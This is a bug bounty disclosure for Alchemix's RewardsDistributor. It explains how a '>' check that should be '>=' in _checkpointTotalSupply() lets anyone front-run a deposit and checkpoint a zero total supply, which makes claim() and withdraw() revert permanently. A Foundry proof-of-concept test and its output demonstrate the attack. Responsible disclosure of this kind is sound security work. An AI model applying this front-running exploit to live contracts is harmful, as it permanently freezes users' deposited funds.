# 31076 - \[SC - Critical] checkpointTotalSupply can checkpoint before a t...

Submitted on May 12th 2024 at 10:57:42 UTC by @Holterhus for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31076

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Permanent freezing of funds

## Description

## Brief/Intro

The `checkpointTotalSupply()` function is in the `RewardsDistributor` and is callable by anyone. The function has an incorrect comparison of `>` instead of `>=`, and this can lead to a checkpoint being recorded when a timestamp is not yet complete. This leads to mistakes in the internal accounting. In the worst case, a user can never successfully `claim()` again, which permanently freezes their `BPT` tokens that have been deposited into `veALCX`.

## Vulnerability Details

The implementation of `_checkpointTotalSupply()` is as follows:

```solidity
function _checkpointTotalSupply() internal {
    address ve = votingEscrow;
    uint256 t = timeCursor;
    uint256 roundedTimestamp = (block.timestamp / WEEK) * WEEK;
    IVotingEscrow(ve).checkpoint();

    for (uint256 i = 0; i < 20; i++) {
        if (t > roundedTimestamp) {
            break;
        } else {
            veSupply[t] = IVotingEscrow(ve).totalSupplyAtT(t);
        }
        t += WEEK;
    }
    timeCursor = t;
}
```

Notice that whenever `veSupply[t]` is assigned to a value, the `t += WEEK` increment happens immediately after, which permanently progresses the cursor so that `veSupply[t]` will never be assigned to again. Also, notice that the `veSupply[t]` assignment is only skipped if `t > roundedTimestamp`. This is incorrect. It should also be skipped if `t == roundedTimestamp`, otherwise this code can record the `totalSupplyAtT()` value before the timestamp itself is complete. This means the check should actually be: `if (t >= roundedTimestamp)`.

## Impact Details

In the scenario when `t == roundedTimestamp`, the code will incorrectly cache the `totalSupplyAtT()` of the current timestamp early. Any actions taken in `veALCX` after this (but on the same timestamp) will not be reflected in the `veSupply[]` value. On the other hand, the `_claimable()` function will correctly account for these last-second actions in each individual `tokenId`. As a result, it is possible for the `balanceOf` value below to contain deposits that did not contribute to the `veSupply[weekCursor]` value:

```solidity
if (balanceOf != 0) {
    toDistribute += (balanceOf * tokensPerWeek[weekCursor]) / veSupply[weekCursor]
}
```

In the worst-case scenario, the first user of `VotingEscrow` can end up in a situation where `veSupply[weekCursor] == 0` and `balanceOf > 0`. In this case, the `claim()` function will revert due to a division by zero, and it will permanently fail to progress past the broken week.

Since the `withdraw()` function in the `veALCX` contract has the following code:

```soldidity
IRewardsDistributor(distributor).claim(_tokenId, false);
```

it will always revert on this line, and users will be in a state where they are permanently unable to withdraw their `BPT` tokens. See the PoC for an example.

## References

See the PoC below.

## Proof of Concept

I have created the following test file and added it to the `tests/` directory:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract CheckpointBugTest is BaseTest {

    address victim = admin;

    constructor() {
        setupContracts(block.timestamp);
    }

    function testCheckpointTotalSupplyBugFreezing() public {

        uint256 ts = ((block.timestamp + 1 weeks) / 1 weeks) * 1 weeks;
        hevm.warp(ts);

        // If a victim is about to deposit, frontrunning and checkpointing them 
        // will store `veSupply[ts] == 0`. This is especially a risk if block builders
        // aren't currently accepting the victim tx's priority fee, so there's a large window
        // of time where the user's tx is in the mempool but not on-chain. This may also just
        // happen by accident.
        distributor.checkpointTotalSupply();
        uint256 tokenId = createVeAlcx(victim, TOKEN_100K, MAXTIME, false);

        console.log("The following state implies that `claim()` will permanently divide by 0:");
        console.log("ts", ts);
        console.log("distributor.timeCursor()", distributor.timeCursor());
        console.log("distributor.veSupply(ts)", distributor.veSupply(ts));
        console.log("veALCX.totalSupplyAtT(ts)", veALCX.totalSupplyAtT(ts));

        hevm.warp(newEpoch());
        voter.distribute();

        vm.expectRevert();
        distributor.claimable(tokenId);

        hevm.warp(veALCX.lockEnd(tokenId));

        vm.startPrank(victim);
        
        veALCX.startCooldown(tokenId);

        hevm.warp(block.timestamp + 1 weeks);

        // Now their BPT is permanently stuck since all calls to `claim()` will revert due to
        // a division by 0. It shouldn't have allowed `veSupply[ts] == 0` to be checkpointed
        // because the timestamp wasn't over yet.
        vm.expectRevert();
        veALCX.withdraw(tokenId);

        vm.stopPrank();
    }
}
```

Running the command `forge test -vvv --match-test testCheckpointTotalSupplyBugFreezing --rpc-url $ETH_RPC_URL` gives the following result:

```
[PASS] testCheckpointTotalSupplyBugFreezing() (gas: 25610541)
Logs:
  The following state implies that `claim()` will permanently divide by 0:
  ts 1715817600
  distributor.timeCursor() 1716422400
  distributor.veSupply(ts) 0
  veALCX.totalSupplyAtT(ts) 199452054794520538483200

```

which shows that the user's attempt to call `withdraw()` indeed reverts and their deposited `BPT` tokens are permanently frozen.
